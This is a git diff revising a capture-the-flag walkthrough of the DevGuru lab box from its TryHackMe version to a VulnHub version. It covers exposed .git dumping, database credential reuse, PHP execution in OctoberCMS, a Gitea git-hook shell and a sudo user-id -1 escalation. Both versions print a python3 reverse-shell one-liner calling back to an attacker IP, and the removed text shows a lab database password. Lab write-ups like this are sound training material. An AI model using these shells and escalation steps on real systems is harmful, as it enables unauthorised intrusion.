@@ -1,21 +1,33 @@
-# TryHackMe-DevGuru
+# VulnHub-DevGuru
+
+## Netdiscover
+
+Run `netdiscover -i wlan0` or `eth0`
+
+<img src="https://imgur.com/U8GskLr.png"/> 
+
+Alternatively this box gives us the ip address we need to scan for nmap , however it's not common that vulhub boxes have a banner to give local ip address when they bootup.
+
+<img src="https://imgur.com/ruFBezk.png"/>
 
 ## NMAP
 
+Now that we have the IP address of our target let's run nmap scan on it
+
 ```
-Nmap scan report for 10.10.172.205                                                                                                          [83/877]
-Host is up (0.16s latency).                                                                                                                         
-Not shown: 65532 closed ports                                                                                                                       
-PORT     STATE SERVICE VERSION                                                                                                                      
-22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) 
-| ssh-hostkey:                                                            
-|   2048 2a:46:e8:2b:01:ff:57:58:7a:5f:25:a4:d6:f2:89:8e (RSA)                                                                                      
+Nmap scan report for 192.168.1.138
+Host is up (0.00014s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 2a:46:e8:2b:01:ff:57:58:7a:5f:25:a4:d6:f2:89:8e (RSA)
 |   256 08:79:93:9c:e3:b4:a4:be:80:ad:61:9d:d3:88:d2:84 (ECDSA)
 |_  256 9c:f9:88:d4:33:77:06:4e:d9:7c:39:17:3e:07:9c:bd (ED25519)
-80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
-|_http-generator: DevGuru                                                 
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-generator: DevGuru
 | http-git: 
-|   10.10.172.205:80/.git/
+|   192.168.1.138:80/.git/
 |     Git repository found!
 |     Repository description: Unnamed repository; edit this file 'description' to name the...
 |     Last commit message: first commit 
@@ -24,171 +36,182 @@ PORT     STATE SERVICE VERSION
 |_    Project type: PHP application (guessed from .gitignore)
 |_http-server-header: Apache/2.4.29 (Ubuntu)
 |_http-title: Corp - DevGuru
-8585/tcp open  unknown
-| fingerprint-strings: 
-|   GenericLines: 
-|     HTTP/1.1 400 Bad Request
-|     Content-Type: text/plain; charset=utf-8
-|     Connection: close
-|     Request
-|   GetRequest: 
-|     HTTP/1.0 200 OK                                                                                                                       [54/877]
-|     Content-Type: text/html; charset=UTF-8
-|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
-|     Set-Cookie: i_like_gitea=f886af904a2de78a; Path=/; HttpOnly
-|     Set-Cookie: _csrf=5bPJDT7tyJUhTZEjhejaOuL5wHU6MTYwNzE2ODk5ODQ5MDExOTg3MQ; Path=/; Expires=Sun, 06 Dec 2020 11:49:58 GMT; HttpOnly
-|     X-Frame-Options: SAMEORIGIN
-|     Date: Sat, 05 Dec 2020 11:49:58 GMT
-|     <!DOCTYPE html>
-|     <html lang="en-US" class="theme-">
-|     <head data-suburl="">
-|     <meta charset="utf-8">
-|     <meta name="viewport" content="width=device-width, initial-scale=1"> 
-|     <meta http-equiv="x-ua-compatible" content="ie=edge">
-|     <title> Gitea: Git with a cup of tea </title>
-|     <link rel="manifest" href="/manifest.json" crossorigin="use-credentials">
-|     <meta name="theme-color" content="#6cc644">
-|     <meta name="author" content="Gitea - Git with a cup of tea" />
-|     <meta name="description" content="Gitea (Git with a cup of tea) is a painless
-|   HTTPOptions: 
-|     HTTP/1.0 404 Not Found
-|     Content-Type: text/html; charset=UTF-8
-|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
-|     Set-Cookie: i_like_gitea=f1edb5b66713a6a2; Path=/; HttpOnly
-|     Set-Cookie: _csrf=5rcSOwMuyIXJxXduyRO14YPZQT06MTYwNzE2ODk5ODgzMzcyMzg5Mg; Path=/; Expires=Sun, 06 Dec 2020 11:49:58 GMT; HttpOnly
-|     <!DOCTYPE html>
-|     <html lang="en-US" class="theme-">
-|     <head data-suburl="">
-|     <meta charset="utf-8">
-|     <meta name="viewport" content="width=device-width, initial-scale=1"> 
-|     <meta http-equiv="x-ua-compatible" content="ie=edge">
-|     <title>Page Not Found - Gitea: Git with a cup of tea </title>
-|     <link rel="manifest" href="/manifest.json" crossorigin="use-credentials">
-|     <meta name="theme-color" content="#6cc644">
-|     <meta name="author" content="Gitea - Git with a cup of tea" />
-|_    <meta name="description" content="Gitea (Git with a c
-1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/
-submit.cgi?new-service :
+MAC Address: 08:00:27:C2:2E:66 (Oracle VirtualBox virtual NIC)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 13.61 seconds
 ```
 
-## PORT 80
+So from the nmap scan we have 2 ports http and ssh but we see something intersting which `.git/` also we see a domain name `devguru.local`. Add the domain to `/etc/hosts`
 
-<img src="https://imgur.com/wkw4oBK.png"/>
+<img src="https://imgur.com/4cGfA58.png"/>
 
-We don't see anything interesting on the web page. Looking at the nmap results there's a `git` directory we find so let's visit that directory
+<img src="https://imgur.com/Rt5p5UR.png"/>
 
-<img src="https://imgur.com/mxuXtfl.png"/>
+On going to `register` tab we won't be able to register any user also we haven't found any creds.
 
-On visting find a page which tells us a reference to `master branch`
+<img src="https://imgur.com/oHgxDf5.png"/>
 
-<img src="https://imgur.com/6ad0R7b.png"/>
+On port 80 we can also see a home page with clicking on the tabs pretty much doesn't do anything
 
-So it seems that there is a github repository on the box , so let's try to dump the files. We can use a tool for that which is called `GitTools`
+<img src="https://imgur.com/UdhpGQU.png"/>
+So I tried ruuning gobuster and found something interesting
+
+<img src="https://imgur.com/AxkMwmb.png"/>
+
+<img src="https://imgur.com/XMYfJ1y.png"/>
+
+But it's the same thing we need credentials.
+
+I did try to find some exploits for `gitea` and `october` but end up failing so the next thing we can do is try to dump the git repository that we saw from the nmap scan.To dump the git repository what you need is called GitTools , really an awesome tool
 
 `https://github.com/internetwache/GitTools`
 
-<img src="https://imgur.com/iAx6MrX.png"/>
+<img src="https://imgur.com/Jf8YhjE.png"/>
 
-After running the tool it took 22 minutes for me dump the `./git` directory
+This script is going to download whatever it can from the repository.
 
-<img src="https://imgur.com/9zqh623.png"/>
+<img src="https://imgur.com/X24yjss.png"/>
 
-<img src="https://imgur.com/OqxPrI9.png"/>
+When it finishes it will look something like this
 
-Now we cannot extract some useful data like this for that we have to use `Extractor` from GitTools
+<img src="https://imgur.com/myHKpaI.png"/>
 
-First move that dumped `./git` folder to a another folder then run the tool 
+<img src="https://imgur.com/XNe3OSF.png"/>
 
-<img src="https://imgur.com/VxHorRk.png"/>
+Going through `objects` folder you'll find bunch of directories and you won't understand how would you read it so another script of extracting useful files from `.git` is called `Extractor` which comes with `GitTools`
 
-<img src="https://imgur.com/PLUyTT9.png"/>
+<img src="https://imgur.com/nn9KMFV.png"/>
 
-As you can see it finds a bunch of files which makes our work way easier
+As you can see it will extract all the files we'll need so you definitely want to have it in your arsenal when it comes to dealing with `.git` on the webserver
 
-Reading through the contents of `.htaccess` we find that there is a login page for database
+<img src="https://imgur.com/79tIOWm.png"/>
 
-<img src="https://imgur.com/OkZn47d.png"/>
+<img src="https://imgur.com/rkuLmuZ.png"/>
 
-<img src="https://imgur.com/Bl8k0Fl.png"/>
+Now two files that you want to look at ,first `adminer.php` which is database management tool means there's a databse which is connected to web application also in `config` folder you'll find `database.php` in which you can get credentials for logging into the database 
 
-Going back to that extracted folder of `./git` we can find `config/database.php` which has credentials for mysql database
+<img src="https://imgur.com/RpcLZ62.png"/>
 
-<img src="https://imgur.com/zgme3uj.png"/>
+<img src="https://imgur.com/FBGzWYp.png"/>
 
-<img src="https://imgur.com/7rYHcwb.png"/>
+<img src="https://imgur.com/E2fuSWE.png"/>
 
-And we can login ourself in , Great !
+Now we are logged in and we can pretty much do everything with the database so let's try creating a new user in the database or we can just clone the `frank` user but here we have to specify the password in that hash which is `bcrypt` seeing identifying it as it is starting from `$2$` 
 
-Now `Octobercms` has blocked extensions of `php` files , you could try changing the extensions to .php3,.php4,.php5,.phtml but it  won't work , what we can do is run php code on html pages 
+Goto `cyberchef` or any other website from which you can generate a text to bcrypt hash and add it in the password field
 
-`https://octobercms.com/forum/post/running-php-code-on-pages`
+<img src="https://imgur.com/xEAStaA.png"/> 
 
-Here it tells how we can do that 
+<img src="https://imgur.com/nJG03cp.png"/>
 
-<img src="https://imgur.com/cH9gjcI.png"/>
+<img src="https://imgur.com/fuF2FRk.png"/>
 
-<img src="https://imgur.com/1xJcMms.png"/>
+Now we have added a new user and we should be able to login to the page we found through `gobuster`
 
-<img src="https://imgur.com/s7NZiU3.png"/>
+<img src="https://imgur.com/FC2sUxX.png"/>
 
-As we can see it does run php code so now we have to craft a php reverse shell to get onto the box,Let's test this for a simple `$_GET["command"]`
+In order to get a shell from the october cms there something we can do is run php code inside html page but it's a little different.
 
-<img src="https://imgur.com/EoScBCY.png"/>
+Through goolging around a little I was able to find a forum where people asked about this thing and got several answers but the code that worked for me was
 
-<img src="https://imgur.com/PKO3li5.png"/>
+<img src="https://imgur.com/xlofAzs.png"/>
 
-<img src="https://imgur.com/MpGFi2u.png"/>
+So let's try testing if this actually works
 
-And we can run system commands so only thing left to do is to setup a netcat listener and run a reverse shell command in that parameter.So I am going to use a python3 reverse shell because python3 is installed on the box
+<img src="https://imgur.com/weWym8c.png"/>
 
-```
-python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.2.54.209",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
-```
+<img src="https://imgur.com/qaJC62U.png"/>
 
-<img src="https://imgur.com/qMkp8m8.png"/>
+This works so now we just have to setup a GET parameter in the code and run system commands
 
-And we got a shell finally , sweet !!
+<img src="https://imgur.com/wbN92tc.png"/>
 
-Now we must enumerate the box , to do that transfer `linpeas` on the target box by python http server
+<img src="https://imgur.com/mTTcV5c.png"/>
 
-<img src="https://imgur.com/ZSWBN92.png"/>
-
-During the enumaration process we find some intersting backup files
-
-<img src="https://imgur.com/kAw2XSu.png"/>
-
-<img src="https://imgur.com/wbViaQ1.png"/>
-
-Here we can see that there is another database for `gitea` which is running on port 8585,also we look at the bottom we'll find that we can use three hashing algorithms `bcrypt`,`pbkdf2` and `scrypt`
-
-<img src="https://imgur.com/M6BTijb.png"/>
-
-So let's login to the database like we did with `octoberdb`
-
-<img src="https://imgur.com/TsNzClM.png"/>
-
-Here I cloned the `frank` user but added a `bcrpyt` password for him because with `pbkdf2` it was not allowing me to login
-
+We are almost just there (not really it is a real pain), just need a reverse shell.
 
 ```
-DB_TYPE             = mysql
-HOST                = 127.0.0.1:3306                                      
-NAME                = gitea
-USER                = gitea                                                                                                                         
-; Use PASSWD = `your password` for quoting if you use special characters in the password.
-PASSWD              = UfFPTF8C8jjxVF2m    
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.7",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
+This one worked for me
+
+<img src="https://imgur.com/ZKCX50B.png"/>
+
+Once we got in the things we could is to just look for any cronjob ruuning or to see if we can run anything as sudo
+
+<img src="https://imgur.com/uVz8EHt.png"/>
+
+But got no luck, now only options is to run `linpeas` and hope it finds something
+
+<img src="https://imgur.com/e2HBws6.png"/>
+
+<img src="https://imgur.com/F27JlAq.png"/>
+
+Now it found something interesting which is a backup configuration file of that `gitea`. From that file we find creds for `gitea`'s database
+
+<img src="https://imgur.com/E1Ix2Lu.png"/>
 
 
- 
---------
+<img src="https://imgur.com/SKKhMFA.png"/>
 
-Here we can find the password for `frank` but it's saved as bcrypt because of `$2$` at the beginning.It would be useless to try cracking the hash we can just add a user with the password encrypted with `bcrypt`
+We now have access to gitea database but here we have to add a new user in order to login to `gitea`
 
-<img src="https://imgur.com/934ryCW.png"/>
+<img src="https://imgur.com/Fevo7ER.png"/>
 
-Then if we try to login we can access the dashboard of `OctoberCMS`
+<img src="https://imgur.com/lggp0ti.png"/>
 
-<img src="https://imgur.com/fu0N4RP.png"/>
+It may look that it's only allowing pbkdf2 hashes but bcrypt also works
 
-By going to `Settings` then `Event log` we can see there's an image
+<img src="https://imgur.com/CuL90QX.png"/>
+
+Now to get a reverse shell there is actullay an exploit for it 
+
+`https://security.szurek.pl/en/gitea-1-4-0-unauthenticated-rce/`
+
+By going through it explained we can get `remote code execution` if we have an administrator account on `gitea` because we need to have `githooks` to be enabled which is just a script that runs automatically whenever an event occurs on github repository. So what we are going to do is 
+
+1. Create a repository (doesn't matter if it's empty)
+
+2. Go to settings of the repository , githooks , click on update then add a reverse shell
+
+3. Clone the repository
+
+4. Add a file to the repository
+
+5. Commit
+
+6. Push
+
+<img src="https://imgur.com/q8vnYmY.png"/>
+
+<img src="https://imgur.com/QWfOLok.png"/>
+
+<img src="https://imgur.com/SAlRS1q.png"/>
+
+<img src="https://imgur.com/vlcqvrH.png"/>
+
+<img src="https://imgur.com/saEKeue.png"/>
+
+<img src="https://imgur.com/CFuHZLz.png"/>
+
+And now if we go to our netcat listener , we will have a shell as `frank`
+
+<img src="https://imgur.com/yNiz4YN.png"/>
+
+<img src="https://imgur.com/gfTmCks.png"/>
+
+<img src="https://imgur.com/4MBiuur.png"/>
+
+Going throguh man pages of `sudoers` it says that we can run this can be ran as any user but not as `root`.
+
+<img src="https://imgur.com/kbZNTkr.png"/>
+
+Now a vulnerability exists in this scenario when a user is allowed to execute command as other users but not as root so when specifiy a user with `-u` and user id with `-1` it's going to consider is a `root` with id `0`
+
+`https://blog.aquasec.com/cve-2019-14287-sudo-linux-vulnerability`
+
+<img src="https://imgur.com/9ihFY4q.png"/>
+
+So this was a really an intersting box that we had to dump the git repository then look for important files after that got our intial foothold as `www-data` through that looked for some configuration files ,edit database ,add repository then pushed our changes into it did learned a lot from this ,it was my first vulnhub machine that I rooted !!!
